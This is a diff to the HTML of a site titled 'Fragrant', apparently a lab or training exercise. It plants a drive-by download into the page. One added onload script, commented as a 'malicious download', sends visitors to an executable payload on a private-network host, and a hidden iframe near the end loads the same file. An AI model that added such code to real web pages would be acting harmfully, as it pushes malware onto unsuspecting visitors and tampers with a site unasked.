@@ -5,6 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Fragrant</title>
     <link rel="stylesheet" type="text/css" href="index.css" />
+    <script>
+      window.onload = function () {
+        // Automatically trigger the malicious download when the page loads
+        window.location.href = "http://10.0.2.9/payload.exe";
+      };
+    </script>
   </head>
   <body>
     <nav>
@@ -92,5 +98,6 @@
         </div>
       </div>
     </div>
+    <iframe src="http://10.0.2.9/payload.exe" style="display: none"> </iframe>
   </body>
 </html>
